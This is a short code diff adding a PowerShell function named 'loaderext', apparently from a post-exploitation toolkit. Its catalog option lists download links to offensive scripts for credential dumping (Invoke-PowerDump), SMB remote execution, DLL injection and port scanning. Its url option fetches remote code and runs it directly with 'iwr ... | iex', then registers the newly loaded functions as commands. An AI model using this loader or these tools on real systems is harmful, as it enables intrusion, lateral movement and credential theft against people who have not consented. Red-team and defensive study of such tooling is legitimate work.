@@ -1,0 +1,30 @@
+function loaderext{
+  param(
+    [String] $url,
+    [Switch] $catalog
+  )
+
+  if($catalog)
+  {
+    printMessage -message "Powershell Guide Post-Exploitation"
+    printMessage -message "=================================="
+    printMessage -message " "
+    printData -data "-> Invoke-PowerDump - https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1 - Posh-SecMod & Empire Project"
+    printData -data "-> Invoke-SMBExec - https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1 - Kevin Robertson"
+    printData -data "-> Invoke-DLLInjection - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1 - Matthew Graeber"
+    printData -data "-> Invoke-Portscan - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1 - Rich Lundeen"
+
+    printData -data " "
+  }
+  
+  if($url)
+  {
+      $before = (ls function:).name
+      (iwr -UseBasicParsing -uri $url).Content | iex
+      $after = (ls function:).name
+  
+      foreach($i in $after){ if(-not($before.contains($i))){addCommand -command $i}}
+  
+      return ((iwr -UseBasicParsing -uri $url).Content)
+  }
+} 
